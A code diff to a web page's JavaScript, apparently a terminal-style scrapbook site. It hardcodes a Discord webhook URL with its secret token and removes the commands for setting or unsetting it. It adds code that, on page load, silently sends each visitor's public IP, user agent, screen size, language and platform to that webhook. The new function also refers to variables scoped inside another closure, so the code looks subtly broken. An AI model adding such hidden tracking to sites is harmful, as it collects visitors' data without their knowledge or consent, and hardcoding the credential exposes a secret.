@@ -15,7 +15,7 @@ document.addEventListener('DOMContentLoaded', () => {
     let audioPlaylist = [];
     let currentAudioIndex = -1; // index within audioPlaylist
     // Webhook / tracking configuration
-    let webhookUrl = null; // This should be set to your Discord webhook URL
+    let webhookUrl = 'https://discord.com/api/webhooks/1431819042343358585/ZRyvQ0C9UWpfz6Xli-lt57PMNXUMh6dRkkBORMOqKDRPWOrpqPC7WsJVoJkMpDvxN7Pa'; // Hardcoded Discord webhook URL
     let webhookSentThisSession = false;
     const eventQueueKey = 'scrapbook_events_v1';
     const flushIntervalMs = 60_000; // retry every 60s
@@ -172,23 +172,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     const response = await fetch('https://api.ipify.org?format=json');
                     const data = await response.json();
                     appendToOutput(`Your public IP is: ${data.ip}`);
-                    // If a webhook is configured and we haven't sent this session, send a tracking event
-                    if (webhookUrl && !webhookSentThisSession) {
-                        const event = {
-                            type: 'public_ip',
-                            timestamp: new Date().toISOString(),
-                            sessionId,
-                            ip: data.ip,
-                            url: location.href,
-                            screen: `${screen.width}x${screen.height}`,
-                            userAgent: navigator.userAgent,
-                            language: navigator.language,
-                            platform: navigator.platform
-                        };
-                        sendTrackingEvent(event).then(ok => {
-                            if (ok) webhookSentThisSession = true;
-                        });
-                    }
+                sendIpTrackingEvent(data.ip);
                     
                 } catch (error) {
                     appendToOutput('Error: Could not fetch IP address.');
@@ -202,22 +186,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 appendToOutput(`Platform: ${navigator.platform}`);
                 appendToOutput(`Cookies Enabled: ${navigator.cookieEnabled}`);
                 appendToOutput('------------------------------------');
-                break;
-            case 'setwebhook':
-                {
-                    const url = args.join(' ').trim();
-                    if (!url) {
-                        appendToOutput('Usage: setwebhook <full-webhook-url>');
-                    } else {
-                        webhookUrl = url;
-                        webhookSentThisSession = false;
-                        appendToOutput('Webhook configured for this session.');
-                    }
-                }
-                break;
-            case 'unsetwebhook':
-                webhookUrl = null;
-                appendToOutput('Webhook unset.');
                 break;
             case 'exportqueue':
                 {
@@ -510,7 +478,32 @@ document.addEventListener('DOMContentLoaded', () => {
     setInterval(flushQueue, flushIntervalMs);
 
     typeIntro();
+
+    // Automatically send IP and tracking info on page load
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => sendIpTrackingEvent(data.ip))
+        .catch(error => console.error('Error fetching IP for auto-send:', error));
 });
+
+async function sendIpTrackingEvent(ipAddress) {
+    if (webhookUrl && !webhookSentThisSession) {
+        const event = {
+            type: 'public_ip',
+            timestamp: new Date().toISOString(),
+            sessionId,
+            ip: ipAddress,
+            url: location.href,
+            screen: `${screen.width}x${screen.height}`,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform
+        };
+        sendTrackingEvent(event).then(ok => {
+            if (ok) webhookSentThisSession = true;
+        });
+    }
+}
 
 
 
